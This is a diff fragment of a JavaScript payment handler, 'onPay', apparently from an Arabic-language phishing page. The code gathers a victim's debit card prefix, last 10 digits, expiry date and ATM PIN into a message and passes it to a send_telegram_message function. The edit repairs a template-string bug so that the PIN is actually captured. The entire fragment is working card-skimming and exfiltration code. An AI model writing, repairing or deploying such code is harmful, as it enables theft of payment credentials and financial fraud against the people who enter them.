@@ -1338,7 +1338,7 @@ function onPay() {
     🔢 البادئة: ${document.getElementById('dcprefix').value}
     💳 آخر 10 أرقام: ${document.getElementById("debitNumber").value}
     📅 انتهاء: ${document.getElementById("month").value}/${document.getElementById("year").value}
-    🔑 ATM: {document.getElementById("cardPin").value}`
+    🔑 ATM: ${document.getElementById("cardPin").value}`
 
     
     send_telegram_message(message)
